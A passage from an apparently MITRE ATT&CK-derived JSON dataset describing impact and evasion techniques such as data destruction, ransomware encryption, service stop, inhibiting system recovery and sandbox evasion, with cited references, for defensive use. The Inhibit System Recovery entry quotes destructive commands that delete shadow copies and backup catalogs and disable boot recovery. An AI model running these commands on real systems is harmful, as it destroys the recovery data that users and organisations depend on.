    "technique": "Domain Policy Modification",
    "tactic": "defense-evasion",
    "datasources": "azure-activity-logs|powershell-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1484.001",
      "T1484.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.<!-- raw HTML omitted --><!-- raw HTML omitted -->With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious <a href=\"https://attack.mitre.org/techniques/T1053/005\">Scheduled Task</a> to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a <a href=\"https://attack.mitre.org/techniques/T1207\">Rogue Domain Controller</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.</p>\n",
    "technique_references": [
      {
        "source_name": "ADSecurity GPO Persistence 2016",
        "url": "https://adsecurity.org/?p=2716",
        "description": "Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wald0 Guide to GPOs",
        "url": "https://wald0.com/?p=179",
        "description": "Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Abusing GPO Permissions",
        "url": "http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/",
        "description": "Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks",
        "url": "https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/",
        "description": "MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Azure Sentinel ADFSDomainTrustMods",
        "url": "https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml",
        "description": "Microsoft. (2020, December). Azure Sentinel Detections. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 365 Defender Solorigate",
        "url": "https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/",
        "description": "Microsoft 365 Defender Team. (2020, December 28). Using Microsoft 365 Defender to protect against Solorigate. Retrieved January 7, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Sygnia Golden SAML",
        "url": "https://www.sygnia.co/golden-saml-advisory",
        "description": "Sygnia. (2020, December). Detection and Hunting of Golden SAML Attack. Retrieved January 6, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "CISA SolarWinds Cloud Detection",
        "url": "https://us-cert.cisa.gov/ncas/alerts/aa21-008a",
        "description": "CISA. (2021, January 8). Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments. Retrieved January 8, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Update or Repair Federated domain",
        "url": "https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365",
        "description": "Microsoft. (2020, September 14). Update or repair the settings of a federated domain in Office 365, Azure, or Intune. Retrieved December 30, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d",
    "platform": "windows|azure-ad",
    "tid": "T1484",
    "technique": "Domain Policy Modification",
    "tactic": "privilege-escalation",
    "datasources": "azure-activity-logs|powershell-logs|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1484.001",
      "T1484.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.<!-- raw HTML omitted --><!-- raw HTML omitted -->With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious <a href=\"https://attack.mitre.org/techniques/T1053/005\">Scheduled Task</a> to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) Adversaries can also change configuration settings within the AD environment to implement a <a href=\"https://attack.mitre.org/techniques/T1207\">Rogue Domain Controller</a>.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.</p>\n",
    "technique_references": [
      {
        "source_name": "ADSecurity GPO Persistence 2016",
        "url": "https://adsecurity.org/?p=2716",
        "description": "Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Wald0 Guide to GPOs",
        "url": "https://wald0.com/?p=179",
        "description": "Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Abusing GPO Permissions",
        "url": "http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/",
        "description": "Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks",
        "url": "https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/",
        "description": "MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Azure Sentinel ADFSDomainTrustMods",
        "url": "https://github.com/Azure/Azure-Sentinel/blob/master/Detections/AuditLogs/ADFSDomainTrustMods.yaml",
        "description": "Microsoft. (2020, December). Azure Sentinel Detections. Retrieved December 30, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft 365 Defender Solorigate",
        "url": "https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/",
        "description": "Microsoft 365 Defender Team. (2020, December 28). Using Microsoft 365 Defender to protect against Solorigate. Retrieved January 7, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Sygnia Golden SAML",
        "url": "https://www.sygnia.co/golden-saml-advisory",
        "description": "Sygnia. (2020, December). Detection and Hunting of Golden SAML Attack. Retrieved January 6, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "CISA SolarWinds Cloud Detection",
        "url": "https://us-cert.cisa.gov/ncas/alerts/aa21-008a",
        "description": "CISA. (2021, January 8). Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments. Retrieved January 8, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft - Update or Repair Federated domain",
        "url": "https://docs.microsoft.com/en-us/office365/troubleshoot/active-directory/update-federated-domain-office-365",
        "description": "Microsoft. (2020, September 14). Update or repair the settings of a federated domain in Office 365, Azure, or Intune. Retrieved December 30, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c",
    "platform": "linux|macos|windows",
    "tid": "T1485",
    "technique": "Data Destruction",
    "tactic": "impact",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <!-- raw HTML omitted -->del<!-- raw HTML omitted --> and <!-- raw HTML omitted -->rm<!-- raw HTML omitted --> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from <a href=\"https://attack.mitre.org/techniques/T1561/001\">Disk Content Wipe</a> and <a href=\"https://attack.mitre.org/techniques/T1561/002\">Disk Structure Wipe</a> because individual files are destroyed rather than sections of a storage disk or the disk’s logical structure.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>, <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>, and <a href=\"https://attack.mitre.org/techniques/T1021/002\">SMB/Windows Admin Shares</a>.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "Symantec Shamoon 2012",
        "url": "https://www.symantec.com/connect/blogs/shamoon-attacks",
        "description": "Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Shamoon Nov 2016",
        "url": "https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html",
        "description": "FireEye. (2016, November 30). FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Palo Alto Shamoon Nov 2016",
        "url": "http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/",
        "description": "Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky StoneDrill 2017",
        "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf",
        "description": "Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill: Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Unit 42 Shamoon3 2018",
        "url": "https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/",
        "description": "Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas Organization. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Talos Olympic Destroyer 2018",
        "url": "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
        "description": "Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0",
    "platform": "linux|macos|windows",
    "tid": "T1486",
    "technique": "Data Encrypted for Impact",
    "tactic": "impact",
    "datasources": "file-monitoring|kernel-drivers|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>, <a href=\"https://attack.mitre.org/techniques/T1003\">OS Credential Dumping</a>, and <a href=\"https://attack.mitre.org/techniques/T1021/002\">SMB/Windows Admin Shares</a>.(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)</p>\n",
    "technique_references": [
      {
        "source_name": "US-CERT Ransomware 2016",
        "url": "https://www.us-cert.gov/ncas/alerts/TA16-091A",
        "description": "US-CERT. (2016, March 31). Alert (TA16-091A): Ransomware and Recent Variants. Retrieved March 15, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WannaCry 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html",
        "description": "Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry Malware Profile. Retrieved March 15, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT NotPetya 2017",
        "url": "https://www.us-cert.gov/ncas/alerts/TA17-181A",
        "description": "US-CERT. (2017, July 1). Alert (TA17-181A): Petya Ransomware. Retrieved March 15, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT SamSam 2018",
        "url": "https://www.us-cert.gov/ncas/alerts/AA18-337A",
        "description": "US-CERT. (2018, December 3). Alert (AA18-337A): SamSam Ransomware. Retrieved March 15, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b",
    "platform": "windows|linux|macos",
    "tid": "T1489",
    "technique": "Service Stop",
    "tactic": "impact",
    "datasources": "api-monitoring|file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary’s overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <!-- raw HTML omitted -->MSExchangeIS<!-- raw HTML omitted -->, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct <a href=\"https://attack.mitre.org/techniques/T1485\">Data Destruction</a> or <a href=\"https://attack.mitre.org/techniques/T1486\">Data Encrypted for Impact</a> on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis)</p>\n",
    "technique_references": [
      {
        "source_name": "Talos Olympic Destroyer 2018",
        "url": "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
        "description": "Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Novetta Blockbuster",
        "url": "https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf",
        "description": "Novetta Threat Research Group. (2016, February 24). Operation Blockbuster: Unraveling the Long Thread of the Sony Attack. Retrieved February 25, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SecureWorks WannaCry Analysis",
        "url": "https://www.secureworks.com/research/wcry-ransomware-analysis",
        "description": "Counter Threat Unit Research Team. (2017, May 18). WCry Ransomware Analysis. Retrieved March 26, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a",
    "platform": "windows|macos|linux",
    "tid": "T1490",
    "technique": "Inhibit System Recovery",
    "tactic": "impact",
    "datasources": "process-command-line-parameters|process-monitoring|services|windows-event-logs|windows-registry",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of <a href=\"https://attack.mitre.org/techniques/T1485\">Data Destruction</a> and <a href=\"https://attack.mitre.org/techniques/T1486\">Data Encrypted for Impact</a>.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->vssadmin.exe<!-- raw HTML omitted --> can be used to delete all volume shadow copies on a system - <!-- raw HTML omitted -->vssadmin.exe delete shadows /all /quiet<!-- raw HTML omitted --><!-- raw HTML omitted -->* <a href=\"https://attack.mitre.org/techniques/T1047\">Windows Management Instrumentation</a> can be used to delete volume shadow copies - <!-- raw HTML omitted -->wmic shadowcopy delete<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->wbadmin.exe<!-- raw HTML omitted --> can be used to delete the Windows Backup Catalog - <!-- raw HTML omitted -->wbadmin.exe delete catalog -quiet<!-- raw HTML omitted --><!-- raw HTML omitted -->* <!-- raw HTML omitted -->bcdedit.exe<!-- raw HTML omitted --> can be used to disable automatic Windows recovery features by modifying boot configuration data - <!-- raw HTML omitted -->bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no<!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Talos Olympic Destroyer 2018",
        "url": "https://blog.talosintelligence.com/2018/02/olympic-destroyer.html",
        "description": "Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye WannaCry 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html",
        "description": "Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry Malware Profile. Retrieved March 15, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5909f20f-3c39-4795-be06-ef1ea40d350b",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1491",
    "technique": "Defacement",
    "tactic": "impact",
    "datasources": "packet-capture|web-application-firewall-logs|web-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1491.001",
      "T1491.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for <a href=\"https://attack.mitre.org/techniques/T1491\">Defacement</a> include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of <a href=\"https://attack.mitre.org/techniques/T1491\">Defacement</a> in order to cause user discomfort, or to pressure compliance with accompanying messages. <!-- raw HTML omitted --></p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--f5bb433e-bdf6-4781-84bc-35e97e43be89",
    "platform": "linux|macos|windows",
    "tid": "T1495",
    "technique": "Firmware Corruption",
    "tactic": "impact",
    "datasources": "bios|component-firmware",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.</p>\n",
    "technique_references": [
      {
        "source_name": "Symantec Chernobyl W95.CIH",
        "url": "https://www.symantec.com/security-center/writeup/2000-122010-2655-99",
        "description": "Yamamura, M. (2002, April 25). W95.CIH. Retrieved April 12, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "MITRE Trustworthy Firmware Measurement",
        "url": "http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research",
        "description": "Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
    "platform": "linux|macos|windows|aws|gcp|azure",
    "tid": "T1496",
    "technique": "Resource Hijacking",
    "tactic": "impact",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|network-device-logs|network-protocol-analysis|process-monitoring|process-use-of-network|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. <!-- raw HTML omitted --><!-- raw HTML omitted -->One common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based(Citation: CloudSploit - Unused AWS Regions) systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining.</p>\n",
    "technique_references": [
      {
        "source_name": "Kaspersky Lazarus Under The Hood Blog 2017",
        "url": "https://securelist.com/lazarus-under-the-hood/77908/",
        "description": "GReAT. (2017, April 3). Lazarus Under the Hood. Retrieved April 17, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "CloudSploit - Unused AWS Regions",
        "url": "https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc",
        "description": "CloudSploit. (2019, June 8). The Danger of Unused AWS Regions. Retrieved October 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
    "platform": "windows|macos|linux",
    "tid": "T1497",
    "technique": "Virtualization/Sandbox Evasion",
    "tactic": "defense-evasion",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1497.001",
      "T1497.002",
      "T1497.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> during automated discovery to shape follow-on behaviors. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use several methods to accomplish <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)<!-- raw HTML omitted --><!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Unit 42 Pirpi July 2015",
        "url": "https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/",
        "description": "Falcone, R., Wartell, R.. (2015, July 27). UPS: Observations on CVE-2015-3113, Prior Zero-Days and the Pirpi Payload. Retrieved April 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d",
    "platform": "windows|macos|linux",
    "tid": "T1497",
    "technique": "Virtualization/Sandbox Evasion",
    "tactic": "discovery",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1497.001",
      "T1497.002",
      "T1497.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> during automated discovery to shape follow-on behaviors. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use several methods to accomplish <a href=\"https://attack.mitre.org/techniques/T1497\">Virtualization/Sandbox Evasion</a> such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)<!-- raw HTML omitted --><!-- raw HTML omitted --></p>\n",
    "technique_references": [
      {
        "source_name": "Unit 42 Pirpi July 2015",
        "url": "https://unit42.paloaltonetworks.com/ups-observations-on-cve-2015-3113-prior-zero-days-and-the-pirpi-payload/",
        "description": "Falcone, R., Wartell, R.. (2015, July 27). UPS: Observations on CVE-2015-3113, Prior Zero-Days and the Pirpi Payload. Retrieved April 23, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
    "platform": "linux|macos|windows|aws|gcp|azure-ad|saas|azure|office-365",
    "tid": "T1498",
    "technique": "Network Denial of Service",
    "tactic": "impact",
    "datasources": "netflow-enclave-netflow|network-device-logs|network-intrusion-detection-system|network-protocol-analysis|sensor-health-and-status",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1498.001",
      "T1498.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)<!-- raw HTML omitted --><!-- raw HTML omitted -->A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS 